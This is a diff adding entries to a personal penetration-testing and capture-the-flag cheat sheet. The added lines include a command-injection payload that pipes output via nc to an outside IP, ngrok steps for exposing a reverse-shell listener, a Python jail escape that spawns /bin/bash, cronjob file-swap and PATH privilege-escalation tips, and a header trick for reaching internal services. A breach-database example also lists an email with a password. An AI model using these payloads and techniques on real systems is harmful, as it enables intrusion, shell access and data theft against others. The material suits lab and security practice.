@@ -60,6 +60,11 @@ and on and on and on
 24. Keep an eye for exposed docker API port 2375 or 2376
 25. No gcc? search for cc
 
+26. DONT FORGET BLIND COMMAND INJECTION (pipe the injection with nc to see the result)
+ex: asdasd;ls -la | nc 10.8.102.36 1234
+
+27. Check for .htpasswd in LFI (/etc/apache2/.htpasswd or in other locations)
+
 
  
 **GPG**
@@ -155,6 +160,19 @@ If you already have access to the target SSH server.
 1. `sudo ssh -L [service_port]:localhost:[service_port] [user]@[target_ip]`
 Example:
 - Portforwarding SMB: `sudo ssh -L 445:localhost:445 yanto@69.69.69.69 -i id_rsa`
+
+
+
+**Public to Local**
+1. ngrok OP, fuck vps
+2. Download and register
+3. ngrok [service] [port]
+
+example:
+sudo nc -lnvp 1234
+ngrok tcp 1234
+
+4. Host a web server public? ngrok http 80
 
 
 
@@ -360,6 +378,7 @@ and many more.. go research on it.
 
 **PATH Privesc**
 ### When it is not run directly, example:
+## IF THERE'S A SECURE PATH, USE THE SECURE PATH DIRECTORY. IT DOESN'T ALWAYS HAVE TO BE ON /tmp or /dev/shm
 /usr/bin/cat >>> cant
 cat >>> can
 1. cd /tmp
@@ -599,6 +618,8 @@ d = 61527
 n = 37627
 ```
 13. Colorful RGB image squares? PIET 
+14. Bruteforcing takes too long? try to reverse the wordlist using `tac`
+Usage: tac wordlist | tee reversed_wordlist
 
 
 **OSINT**
@@ -609,6 +630,16 @@ https://whatsmyname.app/
 https://namecheckup.com/
 https://namechk.com/
 https://scylla.sh/api (Breach database) (ex = email:rudolphthered@hotmail.com, password:spygame, [what to search]:[the data])
+
+
+
+**Python Jail Escape**
+https://anee.me/escaping-python-jails-849c65cf306e
+Python allows us to use built in objects using the __builtins__ module.
+__dict__ >> convert to dictionary representation so it's easier to access.
+
+Example:
+__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash')
 
 
 
@@ -625,3 +656,12 @@ https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/
 5. Statically linked binary is OP. U can use for example statically linked nmap to scan internal network to Pivot to other network. Useful when you are trapped inside a docker and tools are very limited.
 6. Bypass 403 with 403 fuzzer.
 7. File inside a folder but we dont own it and have no permission to write or edit it? If it's inside folder that we owned (example our home folder) we can, delete it. If there's a cronjob, we can just delete it and create malicious file with the same name.
+8. X-Forwarded-For: 127.0.0.1 Can be used to access a network internally
+9. Use 443 or 80 for revshell if other port doesnt work.
+10. /dev/shm is a shared memory directory.
+11. Find VULNERABLE UN-UPDATED SOFTWARE >> apt list --upgradeable (snapd or sudo perhaps)
+12. You can spawn TTY to stabilize shell with typescript (/usr/bin/script).
+- This is useful in a very limited docker env
+ex: /usr/bin/script -qc /bin/bash /dev/null
+
+13. cat /proc/net/route to see if other network available.
